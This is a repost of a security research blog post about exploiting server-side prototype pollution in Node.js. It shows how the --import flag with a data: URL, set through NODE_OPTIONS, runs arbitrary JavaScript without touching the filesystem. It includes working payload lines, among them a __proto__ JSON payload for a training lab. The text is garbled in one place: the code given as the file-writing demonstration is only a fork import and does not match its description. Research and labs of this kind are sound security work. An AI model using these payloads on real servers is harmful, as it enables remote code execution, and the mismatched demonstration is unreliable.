---
title: Exploiting prototype pollution in Node without the filesystem
url: https://buaq.net/go-154943.html
source: unSafe.sh - 不安全
date: 2023-03-24
fetch_date: 2025-10-04T10:27:53.384093
---

# Exploiting prototype pollution in Node without the filesystem

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/36a3797d6017c9b7963f4c0da42d2b3f.jpg)

Exploiting prototype pollution in Node without the filesystem

Published: 23 March 2023 at 15:00 UTC
*2023-3-23 23:0:0
Author: [portswigger.net(查看原文)](/jump-154943.htm)
阅读量:33
收藏*

---

![Gareth Heyes](https://portswigger.net/content/images/profiles/callout_gareth_heyes_114px.png)

* **Published:** 23 March 2023 at 15:00 UTC
* **Updated:** 23 March 2023 at 15:00 UTC

![A container showing some JavaScript prototype pollution code and various wires and monitors with the NodeJS logo on](https://portswigger.net/cms/images/dc/08/9620-article-prototype-pollution-node_blog-article.png)

In this post, we'll introduce a new exploitation technique for [Server-Side Prototype Pollution](https://portswigger.net/web-security/prototype-pollution/server-side).

If you've detected SSPP (maybe using one of [our black-box techniques](https://portswigger.net/research/server-side-prototype-pollution)), the next step towards RCE is to find a sink such as `fork()`. Fork is typically exploited by using the `--require` command line flag using the filesystem or environment variables but what if you can't do that? We'll show you how to use a new command line flag in Node to execute arbitrary code all without requiring a local file.

## Import command line flag

From Node 19.0.0 the `--import` flag allows you to specify a module to load. I found this when designing some Academy labs, I discovered it was possible to use the `--import` command line option to execute arbitrary JavaScript without needing anything on the filesystem! [Michał Bentkowski](https://twitter.com/securitymb) first discovered this with client-side JavaScript using the function-like `import()` in Chrome using the data: protocol but this can also be applied to the Node command line flag too. The attack works like this:

`--import='data:text/javascript,console.log(1337)'`

At the time of testing this is also allowed in NODE\_OPTIONS. We reported this to the Node developers and after careful consideration they decided that it was "not an entrypoint security issue" and therefore didn't violate their threat model.

## Executing arbitrary code

To execute arbitrary code and gain access to the filesystem or system based commands you have to use Node modules using imports. Here is a demonstration on how to use this technique:

`let{fork} = require('child_process');`

The above code uses the `--import` command line flag to load a data URL which uses import to load the Node filesystem module and simply writes a file to /tmp/pwnd with "pwnd" as the contents.

## Try it for yourself

We've upgraded Node on our Academy labs so you can try out this technique. The best lab to use is "[Remote code execution via server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution)" since this uses `fork()`. Using the following code should create a DNS interaction when the `--import` flag is used. Can you modify the payload to solve the lab?

`"__proto__":{
   "NODE_OPTIONS": "--import=\"data:text/javascript,import dns from 'node:dns';dns.lookup('YOUR_COLLABORATOR_ID.oastify.com', x=>1)\""
}`

[Back to all articles](https://portswigger.net/research/articles)

文章来源: https://portswigger.net/research/exploiting-prototype-pollution-in-node-without-the-filesystem
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)